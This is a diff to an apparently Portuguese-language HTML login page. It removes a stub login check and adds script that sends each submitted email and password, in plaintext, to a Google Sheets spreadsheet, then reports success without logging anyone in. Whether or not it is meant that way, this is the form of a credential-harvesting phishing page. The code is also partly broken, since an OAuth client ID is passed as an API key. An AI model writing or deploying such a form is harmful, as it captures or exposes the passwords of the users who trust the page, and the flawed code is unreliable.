@@ -13,52 +13,62 @@
 <form id="loginForm">
     <div>
         <label for="email">Email:</label>
-        <input type="email" id="email" name="email" required>
+        <input type="email" id="email" name="email" autocomplete="email" required>
     </div>
     <div>
         <label for="password">Senha:</label>
-        <input type="password" id="password" name="password" required>
+        <input type="password" id="password" name="password" autocomplete="current-password" required>
     </div>
     <button type="submit">Entrar</button>
 </form>
 
 <script>
-    // Função para carregar a API do Google Sheets e a biblioteca auth2
-    function loadGoogleAPI() {
-        gapi.load('client:auth2', initGoogleClient);
-    }
+    // Função para enviar dados para a planilha
+    function sendDataToSheet(email, password) {
+        // Dados a serem enviados para a planilha
+        var newData = [
+            [email, password]
+        ];
 
-    // Função para inicializar o cliente da API do Google Sheets
-    function initGoogleClient() {
+        // Autentica com a API do Google Sheets
         gapi.client.init({
             apiKey: '1069670603503-9akb84s507091r819ngbnm8j7dfnj2v5.apps.googleusercontent.com',
             discoveryDocs: ["https://sheets.googleapis.com/$discovery/rest?version=v4"],
         }).then(function() {
-            console.log('API do Google Sheets inicializada com sucesso!');
+            // Envia os dados para a planilha
+            return gapi.client.sheets.spreadsheets.values.append({
+                spreadsheetId: '10SzlIm9UmtghsOmq5PM0yw7yHzy_I-1P_UBH95ugtKM',
+                range: 'Planilha1!A:B',
+                valueInputOption: 'RAW', // Método de entrada dos dados
+                resource: { values: newData }
+            });
+        }).then(function(response) {
+            console.log('Dados enviados com sucesso para a planilha:', response);
+            // Exibe uma mensagem de sucesso na página
+            var successMessage = document.createElement('p');
+            successMessage.textContent = 'Dados enviados com sucesso para a planilha!';
+            document.body.appendChild(successMessage);
         }).catch(function(error) {
-            console.error('Erro ao inicializar a API do Google Sheets:', error);
+            console.error('Erro ao enviar dados para a planilha:', error);
+            // Exibe uma mensagem de erro na página
+            var errorMessage = document.createElement('p');
+            errorMessage.textContent = 'Erro ao enviar dados para a planilha. Verifique o console para mais detalhes.';
+            document.body.appendChild(errorMessage);
         });
     }
 
-    // Função para verificar o login
-    function checkLogin() {
-        // Obtém os valores dos campos de entrada
+    // Event listener para o envio do formulário
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Evita o envio padrão do formulário
         var email = document.getElementById('email').value;
         var password = document.getElementById('password').value;
-
-        // Realiza o login
-        console.log('Verificando login...');
-        // Adicione aqui sua lógica de verificação de login
-    }
-
-    // Adiciona o evento de submit ao formulário de login
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // Previne o envio do formulário
-        checkLogin(); // Verifica o login ao clicar em "Entrar"
+        sendDataToSheet(email, password); // Chama a função para enviar dados para a planilha
     });
 
     // Carrega a API do Google Sheets e a biblioteca auth2 quando a página é totalmente carregada
-    window.onload = loadGoogleAPI;
+    gapi.load('client:auth2', function() {
+        gapi.auth2.init(); // Inicializa a biblioteca auth2
+    });
 
 </script>
 
